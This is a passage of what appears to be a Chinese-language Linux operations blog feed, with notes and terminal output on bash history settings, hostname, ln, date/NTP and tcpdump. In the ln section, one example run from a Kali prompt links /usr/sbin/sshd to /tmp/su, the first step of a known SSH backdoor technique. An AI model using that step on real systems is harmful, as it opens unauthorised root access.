class="hljs-string">-08</span><span class="hljs-string">-16</span> history<br>   11  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> vim /etc/bashrc<br>   12  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> source /etc/bashrc<br>   13  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> history<br>   14  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> source /etc/bashrc<br>   15  2022<span class="hljs-string">-08</span><span class="hljs-string">-16</span> history<br></code></pre></td></tr></table></figure><p>test</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nix">[test@iZbp1191gh7vw52537lyxrZ root]$ cat <span class="hljs-symbol">~/.bashrc</span><br><span class="hljs-comment"># .bashrc</span><br><br><span class="hljs-comment"># Source global definitions</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-operator">-</span>f <span class="hljs-symbol">/etc/bashrc</span> ]; <span class="hljs-keyword">then</span><br>. <span class="hljs-symbol">/etc/bashrc</span><br>fi<br>H<span class="hljs-attr">ISTTIMEFORMAT</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;%c &quot;</span><br><span class="hljs-comment"># Uncomment the following line if you don&#x27;t like systemctl&#x27;s auto-paging feature:</span><br><span class="hljs-comment"># export SYSTEMD_PAGER=</span><br><br><span class="hljs-comment"># User specific aliases and functions</span><br></code></pre></td></tr></table></figure><p>source ~&#x2F;.bashrc</p><p>test history</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">[<span class="hljs-built_in">test</span>@iZbp1191gh7vw52537lyxrZ root]$ <span class="hljs-built_in">history</span><br>    1  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span><br>    2  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span> -w<br>    3  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span><br>    4  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span> -w<br>    5  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span><br>    6  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">ls</span> -lat ~/.bash_history<br>    7  2022年08月13日 星期六 22时56分56秒 <span class="hljs-built_in">history</span><br>    8  2022年08月13日 星期六 22时57分01秒 lll<br>    9  2022年08月13日 星期六 22时57分03秒 <span class="hljs-built_in">history</span><br>   10  2022年08月14日 星期日 10时41分01秒 <span class="hljs-built_in">exit</span><br>   11  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">history</span><br>   12  2022年08月16日 星期二 23时09分35秒 <span class="hljs-built_in">cat</span> ~/.bashrc<br>   13  2022年08月16日 星期二 23时09分53秒 vim ~/.bashrc<br>   14  2022年08月16日 星期二 23时10分59秒 <span class="hljs-built_in">source</span> ~/.bashrc<br>   15  2022年08月16日 星期二 23时11分01秒 <span class="hljs-built_in">history</span><br>   16  2022年08月16日 星期二 23时11分27秒 <span class="hljs-built_in">cat</span> ~/.bashrc<br>   17  2022年08月16日 星期二 23时12分14秒 vim ~/.bashrc<br>   18  2022年08月16日 星期二 23时12分28秒 <span class="hljs-built_in">source</span> ~/.bashrc<br>   19  2022年08月16日 星期二 23时12分42秒 <span class="hljs-built_in">history</span><br></code></pre></td></tr></table></figure><p>默认情况下，</p><p>配置文件示例</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">HISTTIMEFORMAT</span>=<span class="hljs-string">&quot;`whoami` %c  &quot;</span><br><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">HISTSIZE</span>=100<br><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">HISTFILESIZE</span>=10<br></code></pre></td></tr></table></figure><h2 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h2><p>1、默认情况下退出终端（会话）后，会将历史记录写入～&#x2F;.bash_history文件</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hostname</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/hostname/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/hostname/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>显示系统主机名</p><h2 id="查看主机名"><a href="#查看主机名" class="headerlink" title="查看主机名"></a>查看主机名</h2><p>命令</p><p>hostname </p><p>cenots6：读取的是 &#x2F;etc&#x2F;sysconfig&#x2F;network 中的配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[root@rdimtools1.ops.xlzbb1 /tmp]</span><span class="hljs-comment"># cat /etc/sysconfig/network</span><br><span class="hljs-attr">NETWORKING</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attr">HOSTNAME</span>=rdimtools1.ops.xlzbb1.node.com<br></code></pre></td></tr></table></figure><p>centos7,8&#x2F;ubuntu：读取的是 &#x2F;etc&#x2F;hostname中的值</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@110</span> cron.d]<span class="hljs-meta"># cat /etc/hostname</span><br><span class="hljs-number">110</span><br></code></pre></td></tr></table></figure><h2 id="设置主机名"><a href="#设置主机名" class="headerlink" title="设置主机名"></a>设置主机名</h2><p>centos6可以设置带有”:”这种特殊字符的主机名。</p><p>​存在本机使用SMTP时，ehlo报错。</p><p>centos7不可以设置带有”:”这种特殊字符的主机名</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">(base) [root@<span class="hljs-number">110</span> ~]# <span class="hljs-built_in">hostname</span> <span class="hljs-number">110</span>:<span class="hljs-number">1234</span><br><span class="hljs-built_in">hostname</span>: the specified <span class="hljs-built_in">hostname</span> <span class="hljs-keyword">is</span> invalid<br></code></pre></td></tr></table></figure><h3 id="临时设置"><a href="#临时设置" class="headerlink" title="临时设置"></a>临时设置</h3><p><strong>hostname 主机名</strong></p><p>不需要重启，新开终端之后就是新设置的hostname</p><p>重启之后，临时hostname失效</p><h3 id="永久设置"><a href="#永久设置" class="headerlink" title="永久设置"></a>永久设置</h3><p>需要重启</p><p><strong>hostnamectl命令方式</strong></p><p>hostnamectl set-hostname hostname</p><p>会修改&#x2F;etc&#x2F;hostname的文件内容</p><p><strong>修改文件方式</strong></p><p>centos6</p><p>修改 &#x2F;etc&#x2F;sysconfig&#x2F;network 中的HOSTNAME字段</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">vim /etc/sysconfig<span class="hljs-built_in">/network</span><br><span class="hljs-built_in"></span><br><span class="hljs-attribute">NETWORKING</span>=<span class="hljs-literal">yes</span><br><span class="hljs-attribute">HOSTNAME</span>=iZ8vb4dup6si15ggr13rt4Z<br><span class="hljs-attribute">NETWORKING_IPV6</span>=<span class="hljs-literal">no</span><br><span class="hljs-attribute">PEERNTP</span>=<span class="hljs-literal">no</span><br></code></pre></td></tr></table></figure><p>centos7</p><p>修改&#x2F;etc&#x2F;hostname中的内容即可</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> /etc/<span class="hljs-built_in">hostname</span><br><br><span class="hljs-number">120</span><br></code></pre></td></tr></table></figure><h3 id="hostnamectl"><a href="#hostnamectl" class="headerlink" title="hostnamectl"></a>hostnamectl</h3><p>获取服务器主机名</p><p>hostnamectl</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nix">(base) [root@<span class="hljs-number">120</span> ~]<span class="hljs-comment"># hostnamectl</span><br>   Static <span class="hljs-params">hostname:</span> <span class="hljs-number">110</span><br>         Icon <span class="hljs-params">name:</span> computer-vm<br>           <span class="hljs-params">Chassis:</span> vm<br>        Machine <span class="hljs-params">ID:</span> f0f31005fb5a436d88e3c6cbf54e25aa<br>           Boot <span class="hljs-params">ID:</span> <span class="hljs-number">4304</span>a1d611aa4086a7aeb527a884dbd1<br>    <span class="hljs-params">Virtualization:</span> kvm<br>  Operating <span class="hljs-params">System:</span> CentOS Linux <span class="hljs-number">7</span> (Core)<br>       CPE OS <span class="hljs-params">Name:</span> cpe:<span class="hljs-operator">/</span>o:centos:centos:<span class="hljs-number">7</span><br>            <span class="hljs-params">Kernel:</span> Linux <span class="hljs-number">3.10</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">1160.36</span>.<span class="hljs-number">2</span>.el7.x86_64<br>      <span class="hljs-params">Architecture:</span> x86-<span class="hljs-number">64</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ln</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/ln/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/ln/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>为文件创建链接，默认创建的均为硬链接</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p><strong>ln [OPTION]… [-T] TARGET LINK_NAME</strong></p><p>为TARGET创建链接为LINK_NAME</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">(base) [root@110 ~]# <span class="hljs-built_in">ln</span> /etc/passwd <span class="hljs-built_in">test</span><br>(base) [root@110 ~]# <span class="hljs-built_in">ls</span> -la <span class="hljs-built_in">test</span><br>-rw-r--r-- 2 root root 1343 Dec 16 00:13 <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p><strong>ln [OPTION]… TARGET</strong></p><p>为TARGET创建链接在当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">(base) [root@110 <span class="hljs-built_in">test</span>]# <span class="hljs-built_in">ln</span> /etc/passwd<br>(base) [root@110 <span class="hljs-built_in">test</span>]# <span class="hljs-built_in">ls</span><br>passwd<br>(base) [root@110 <span class="hljs-built_in">test</span>]# <span class="hljs-built_in">ls</span> -ilh passwd<br>932192 -rw-r--r-- 2 root root 1.4K Dec 16 00:13 passwd<br>(base) [root@110 <span class="hljs-built_in">test</span>]# <span class="hljs-built_in">ls</span> -ilh /etc/passwd<br>932192 -rw-r--r-- 2 root root 1.4K Dec 16 00:13 /etc/passwd<br></code></pre></td></tr></table></figure><p><strong>ln [OPTION]… TARGET… DIRECTORY</strong><br><strong>ln [OPTION]… -t DIRECTORY TARGET…</strong></p><p>创建指向DIRECTORY中的每个TARGET的链接</p><p>参数</p><p>-s, –symbolic</p><p>make symbolic links instead of hard links</p><p>使用符号链接（软连接）替换硬链接</p><p>-f, –force</p><p>remove existing destination files</p><p>删除已有的目标文件，避免出现</p><p><strong>备注</strong></p><p>1、默认为硬链接。</p><p>2、LINK_NAME（也就是链接名）必须为不存在的，也就是链接名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root💀kali2021)-[~]<br>└─# <span class="hljs-built_in">ln</span> /usr/sbin/sshd /tmp/su<br><span class="hljs-built_in">ln</span>: 无法创建硬链接 <span class="hljs-string">&#x27;/tmp/su&#x27;</span>: 文件已存在<br></code></pre></td></tr></table></figure><p>3、硬链接时，源文件必须存在</p><p>4、软连接时，源文件可不存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">(base) [root@110 <span class="hljs-built_in">test</span>]# <span class="hljs-built_in">ln</span> -s /etc/passwds passwds<br>(base) [root@110 <span class="hljs-built_in">test</span>]# <span class="hljs-built_in">ls</span> -lia passwds<br>918146 lrwxrwxrwx 1 root root 12 Jan  3 15:05 passwds -&gt; /etc/passwds<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>data&amp;time</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/date&amp;time/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/date&amp;time/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>获取和设置主机日期时间</p><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><h3 id="获取主机当前时间"><a href="#获取主机当前时间" class="headerlink" title="获取主机当前时间"></a>获取主机当前时间</h3><p>date</p><p>date -R</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tap">ubuntu@VM-8-5-ubuntu:~$ date<br>Mon<span class="hljs-number"> 15 </span>Nov<span class="hljs-number"> 2021 </span>06:29:10 PM CST<br><br>(base) root@VM-8-5-ubuntu:~<span class="hljs-comment"># date -R</span><br>Thu,<span class="hljs-number"> 19 </span>May<span class="hljs-number"> 2022 </span>22:29:17 +0800<br><br>(base) [root@120 ~]<span class="hljs-comment"># date</span><br>Mon Nov<span class="hljs-number"> 15 </span>18:24:00 CST 2021<br></code></pre></td></tr></table></figure><h3 id="修改日期"><a href="#修改日期" class="headerlink" title="修改日期"></a>修改日期</h3><p>需要root权限</p><p><strong>sudo date -s “YYYY-MM-DD hh:mm[:ss]”</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu</span>@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubuntu:~$ sudo date -s <span class="hljs-string">&quot;2022-11-15 13:14:15&quot;</span><br><span class="hljs-attribute">Tue</span> <span class="hljs-number">15</span> Nov <span class="hljs-number">2022</span> <span class="hljs-number">01</span>:<span class="hljs-number">14</span>:<span class="hljs-number">15</span> PM CST<br></code></pre></td></tr></table></figure><h3 id="修改时间"><a href="#修改时间" class="headerlink" title="修改时间"></a>修改时间</h3><p>需要root权限</p><p><strong>sudo date -s hh:mm[:ss]</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu</span>@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubuntu:~$ sudo date -s <span class="hljs-number">19</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attribute">Mon</span> <span class="hljs-number">15</span> Nov <span class="hljs-number">2021</span> <span class="hljs-number">07</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> PM CST<br></code></pre></td></tr></table></figure><h3 id="更新时间"><a href="#更新时间" class="headerlink" title="更新时间"></a>更新时间</h3><h4 id="安装-ntpdate"><a href="#安装-ntpdate" class="headerlink" title="安装 ntpdate"></a>安装 ntpdate</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">apt</span> install ntpdate         # version <span class="hljs-number">1</span>:<span class="hljs-number">4</span>.<span class="hljs-number">2</span>.<span class="hljs-number">8</span>p12+dfsg-<span class="hljs-number">3</span>ubuntu<span class="hljs-number">4.20.04.1</span>, or<br><br><span class="hljs-attribute">apt</span> install ntpsec-ntpdate  # version <span class="hljs-number">1</span>.<span class="hljs-number">1</span>.<span class="hljs-number">8</span>+dfsg1-<span class="hljs-number">4</span>build1<br></code></pre></td></tr></table></figure><h4 id="更新时间-1"><a href="#更新时间-1" class="headerlink" title="更新时间"></a>更新时间</h4><p>sudo ntpdate 时间服务器域名&#x2F;ip</p><h4 id="时间服务器"><a href="#时间服务器" class="headerlink" title="时间服务器"></a>时间服务器</h4><p>中国  cn.ntp.org.cn</p><p>中国教育网  edu.ntp.org.cn</p><p>中国香港  hk.ntp.org.cn</p><p>中国台湾  tw.ntp.org.cn</p><p>日本  jp.ntp.org.cn</p><p>韩国  kr.ntp.org.cn</p><p>新加坡  sgp.ntp.org.cn</p><p>美国  us.ntp.org.cn</p><p>阿里云 ntp.aliyun.com</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">(<span class="hljs-built_in">base</span>) root@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubun<span class="hljs-symbol">tu:</span>~# ntpdate cn.ntp.org.cn<br><span class="hljs-number">20</span> May <span class="hljs-symbol">00:04</span><span class="hljs-symbol">:16</span> ntpdate[<span class="hljs-number">1815</span>]<span class="hljs-symbol">:</span> adjust <span class="hljs-built_in">time</span> server <span class="hljs-number">120.25</span>.<span class="hljs-number">115.20</span> <span class="hljs-built_in">offset</span> <span class="hljs-number">0.262073</span> <span class="hljs-built_in">sec</span><br></code></pre></td></tr></table></figure><p>报错信息</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">(base) root@VM<span class="hljs-number">-8</span><span class="hljs-number">-5</span>-ubuntu:/<span class="hljs-comment"># sudo ntpdate 120.25.115.20</span><br><span class="hljs-number">19</span> May <span class="hljs-number">22</span>:<span class="hljs-number">10</span>:<span class="hljs-number">28</span> ntpdate[<span class="hljs-number">978756</span>]: <span class="hljs-literal">no</span> server suitable <span class="hljs-keyword">for</span> synchronization found<br></code></pre></td></tr></table></figure><p>定时任务周期性更新时间</p><h3 id="时间自动更新配置"><a href="#时间自动更新配置" class="headerlink" title="时间自动更新配置"></a>时间自动更新配置</h3><h4 id="查看时间自动更新配置"><a href="#查看时间自动更新配置" class="headerlink" title="查看时间自动更新配置"></a>查看时间自动更新配置</h4><p>timedatectl show </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(base) root@VM-8-5-ubuntu:/# timedatectl show<br><span class="hljs-attribute">Timezone</span>=Asia/Shanghai<br><span class="hljs-attribute">LocalRTC</span>=<span class="hljs-literal">no</span><br><span class="hljs-attribute">CanNTP</span>=<span class="hljs-literal">no</span><br><span class="hljs-attribute">NTP</span>=<span class="hljs-literal">no</span><br><span class="hljs-attribute">NTPSynchronized</span>=<span class="hljs-literal">no</span><br><span class="hljs-attribute">TimeUSec</span>=Fri 2022-05-20 00:10:57 CST<br><span class="hljs-attribute">RTCTimeUSec</span>=Fri 2022-05-20 00:10:57 CST<br></code></pre></td></tr></table></figure><p>NTP参数标志是否自动更新</p><p>yes ：自动更新</p><p>no：不自动更新</p><p>开启自动更新</p><p>timedatectl set-ntp yes</p><p>报错信息</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(base) root@VM-8-5-ubuntu:/# timedatectl set-ntp <span class="hljs-literal">yes</span><br>Failed <span class="hljs-keyword">to</span> <span class="hljs-built_in">set</span> ntp:<span class="hljs-built_in"> NTP </span><span class="hljs-keyword">not</span> supported<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tcpdump</title>
    <link href="/2024/04/03/yunwei/yunweicommands/Linuxcommands/tcpdump/"/>
    <url>/2024/04/03/yunwei/yunweicommands/Linuxcommands/tcpdump/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>tcpdump 用于抓取网络数据包，Linux必须为root权限</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>tcpdump 参数</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><h4 id="i"><a href="#i" class="headerlink" title="-i"></a>-i</h4><p>指定要抓取的网卡</p><h4 id="port-端口号"><a href="#port-端口号" class="headerlink" title="port 端口号"></a>port 端口号</h4><p>指定要抓取的端口(源或目的)</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns">[root@localhost tmp]# tcpdump -i eth0 port <span class="hljs-number">1234</span> -v<br>dropped privs to tcpdump<br>tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size <span class="hljs-number">262144</span> bytes<br><span class="hljs-number">23</span>:<span class="hljs-number">41</span>:<span class="hljs-number">03.519911</span> IP (tos <span class="hljs-number">0</span>x0, ttl <span class="hljs-number">60</span>, id <span class="hljs-number">29943</span>, offset <span class="hljs-number">0</span>, flags [DF], proto TCP (<span class="hljs-number">6</span>), length <span class="hljs-number">60</span>)<br>    <span class="hljs-number">10.210.128.37</span>.<span class="hljs-number">53670</span> &gt; <span class="hljs-number">10.13.8.56</span>.search-agent: Flags [S], cksum <span class="hljs-number">0</span>xc4ec (correct), seq <span class="hljs-number">2917953384</span>, win <span class="hljs-number">64240</span>, options [mss <span class="hljs-number">1460</span>,sackOK,TS val <span class="hljs-number">2673498046</span> ecr <span class="hljs-number">0</span>,nop,wscale <span class="hljs-number">7</span>], length <span class="hljs-number">0</span><br><span class="hljs-number">23</span>:<span class="hljs-number">41</span>:<span class="hljs-number">03.519977</span> IP (tos <span class="hljs-number">0</span>x0, ttl <span class="hljs-number">64</span>, id <span class="hljs-number">54948</span>, offset <span class="hljs-number">0</span>, flags [none], proto TCP (<span class="hljs-number">6</span>), length <span class="hljs-number">60</span>)<br>    <span class="hljs-number">10.13.8.56</span>.search-agent &gt; <span class="hljs-number">10.210.128.37</span>.<span class="hljs-number">53670</span>: Flags [S.], cksum <span class="hljs-number">0</span>x9d6a (incorrect -&gt; <span class="hljs-number">0</span>x10bd), seq <span class="hljs-number">69084297</span>, ack <span class="hljs-number">2917953385</span>, win <span class="hljs-number">28960</span>, options [mss <span class="hljs-number">1460</span>,sackOK,TS val <span class="hljs-number">1031657418</span> ecr <span class="hljs-number">2673498046</span>,nop,wscale <span class="hljs-number">7</span>], length <span class="hljs-number">0</span><br><span class="hljs-number">23</span>:<span class="hljs-number">41:03.521252</span> IP (tos <span class="hljs-number">0</span>x0, ttl <span class="hljs-number">60</span>, id <span class="hljs-number">29944</span>, offset <span class="hljs-number">0</span>, flags [DF], proto TCP (<span class="hljs-number">6</span>), length <span class="hljs-number">52</span>)<br>    <span class="hljs-number">10.210.128.37</span>.<span class="hljs-number">53670</span> &gt; <span class="hljs-number">10.13.8.56</span>.search-agent: Flags [.], cksum <span class="hljs-number">0</span>xaeb1 (correct), ack <span class="hljs-number">1</span>, win <span class="hljs-number">502</span>, options [nop,nop,TS val <span class="hljs-number">2673498048</span> ecr <span class="hljs-number">1031657418</span>], length <span class="hljs-number">0</span><br>^C<br><span class="hljs-number">3</span> packets captured<br><span class="hljs-number">8</span> packets received by filter<br><span class="hljs-number">0</span> packets dropped by kernel<br></code></pre></td></tr></table></figure><h4 id="src-port-端口号"><a href="#src-port-端口号" class="headerlink" title="src port 端口号"></a>src port 端口号</h4><p>指定要抓取源端口</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[root@localhost tmp]# tcpdump -i eth0 src port <span class="hljs-number">1234</span> -v<br>dropped privs <span class="hljs-keyword">to</span> tcpdump<br>tcpdump: listening <span class="hljs-keyword">on</span> eth0, link-<span class="hljs-keyword">type</span> EN10MB (Ethernet), capture size <span class="hljs-number">262144</span> bytes<br><span class="hljs-number">23</span>:<span class="hljs-number">39</span>:<span class="hljs-number">28.345555</span> IP (tos <span class="hljs-number">0x0</span>, ttl <span class="hljs-number">64</span>, id <span class="hljs-number">50988</span>, <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span>, flags [<span class="hljs-keyword">none</span>], proto TCP (<span class="hljs-number">6</span>), length <span class="hljs-number">60</span>)<br>    <span class="hljs-number">10.13</span><span class="hljs-number">.8</span><span class="hljs-number">.56</span>.<span class="hljs-keyword">search</span>-agent &gt; <span class="hljs-number">10.210</span><span class="hljs-number">.128</span><span class="hljs-number">.37</span><span class="hljs-number">.53666</span>: Flags [S.], cksum <span class="hljs-number">0x9d6a</span> (incorrect -&gt; <span class="hljs-number">0x8556</span>), seq <span class="hljs-number">2479389079</span>, ack <span class="hljs-number">1424840359</span>, win <span class="hljs-number">28960</span>, <span class="hljs-keyword">options</span> [mss <span class="hljs-number">1460</span>,sackOK,TS val <span class="hljs-number">1031562244</span> ecr <span class="hljs-number">2673402874</span>,nop,wscale <span class="hljs-number">7</span>], length <span class="hljs-number">0</span><br>^C<br><span class="hljs-number">1</span> packet captured<br><span class="hljs-number">2</span> packets received <span class="hljs-keyword">by</span> <span class="hljs-keyword">filter</span><br><span class="hljs-number">0</span> packets dropped <span class="hljs-keyword">by</span> kernel<br></code></pre></td></tr></table></figure><h4 id="dst-port-端口号"><a href="#dst-port-端口号" class="headerlink" title="dst port 端口号"></a>dst port 端口号</h4><p>指定要抓取目的端口</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs applescript">[root@localhost tmp]<span class="hljs-comment"># tcpdump -i eth0 dst port 1234 -v</span><br>dropped privs <span class="hljs-keyword">to</span> tcpdump<br>tcpdump: listening <span class="hljs-keyword">on</span> eth0, link-type EN10MB (Ethernet), capture size <span class="hljs-number">262144</span> bytes<br><span class="hljs-number">23</span>:<span class="hljs-number">40</span>:<span class="hljs-number">20.219983</span> IP (tos <span class="hljs-number">0x0</span>, ttl <span class="hljs-number">60</span>, <span class="hljs-built_in">id</span> <span class="hljs-number">58829</span>, <span class="hljs-built_in">offset</span> <span class="hljs-number">0</span>, flags [DF], proto TCP (<span class="hljs-number">6</span>), <span class="hljs-built_in">length</span> <span class="hljs-number">60</span>)<br>    <span class="hljs-number">10.210</span><span class="hljs-number">.128</span><span class="hljs-number">.37</span><span class="hljs-number">.53668</span> &gt; <span class="hljs-number">10.13</span><span class="hljs-number">.8</span><span class="hljs-number">.56</span>.search-agent: Flags [S], cksum <span class="hljs-number">0x0c8b</span> (correct), seq <span class="hljs-number">2144206605</span>, win <span 